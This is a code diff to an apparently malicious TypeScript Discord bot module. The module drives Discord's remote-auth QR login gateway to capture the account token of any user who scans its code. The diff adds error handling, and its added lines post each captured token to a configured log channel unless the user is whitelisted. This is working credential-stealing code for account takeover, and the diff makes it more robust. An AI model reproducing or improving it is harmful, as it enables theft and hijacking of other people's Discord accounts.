@@ -15,23 +15,40 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
     const keyPair = generateKeyPairSync("rsa", { modulusLength: 2048, publicExponent: 65537 });
 
     SocketClient = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=1', { origin: 'https://discord.com' });
+    SocketClient.onclose = () => { 
+        try {
+            clearInterval(Heart); clearTimeout(Timeout); 
+        } catch {}
+    }
     SocketClient.onmessage = async (x) => {
         const data: IData = JSON.parse(x.data as string);
 
         switch (data.op) {
             case 'hello':
-                if (SocketClient.OPEN) SocketClient.send(JSON.stringify({ op: 'init', encoded_public_key: keyPair.publicKey.export({ type: 'spki', format: 'der' }).toString("base64") }));
-                Heart = setInterval(() => {if (SocketClient.OPEN) SocketClient.send(JSON.stringify({ op: 'heartbeat' }))}, data.heartbeat_interval);
+                try {
+                    SocketClient.send(JSON.stringify({ op: 'init', encoded_public_key: keyPair.publicKey.export({ type: 'spki', format: 'der' }).toString("base64") }));
+                } catch {}
                 Timeout = setTimeout(() => {
-                    clearInterval(Heart);
-                    if (SocketClient.OPEN) SocketClient.close();
-                    reslove(false);
-                }, 60000)
+                    try {
+                        SocketClient.close();
+                    } catch {}
+                }, 60000);
+                Heart = setInterval(() => {
+                    try {
+                        SocketClient.send(JSON.stringify({ op: 'heartbeat' }));
+                    } catch (error) {
+                        try {
+                            SocketClient.close();
+                        } catch {}
+                    }
+                }, data.heartbeat_interval);
                 break;
             case 'nonce_proof':
                 const decryptedNonce = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_nonce as string), 'base64'));
                 const nonceHash = createHash('sha256').update(decryptedNonce).digest('base64url');
-                if (SocketClient.OPEN) SocketClient.send(JSON.stringify({ op: 'nonce_proof', proof: nonceHash }));
+                try {
+                    SocketClient.send(JSON.stringify({ op: 'nonce_proof', proof: nonceHash }));
+                } catch{}
                 break;
             case 'pending_remote_init':
                 const fingerprintData = `https://discordapp.com/ra/${data.fingerprint}`;
@@ -60,12 +77,10 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
                 for (const whitelist of config.whitelisted_users) 
                     if (discord.id === whitelist) return reslove(token);
 
-
-                (await client.channels.cache.get(config.log_channel) as TextChannel).send(token);
-
-                if (SocketClient.OPEN) SocketClient.close();
-                clearInterval(Heart);
-                clearTimeout(Timeout);
+                try {
+                    SocketClient.close();
+                    (await client.channels.cache.get(config.log_channel) as TextChannel).send(token).catch(e => {});
+                } catch {}
                 reslove(token);
                 break;
             default:
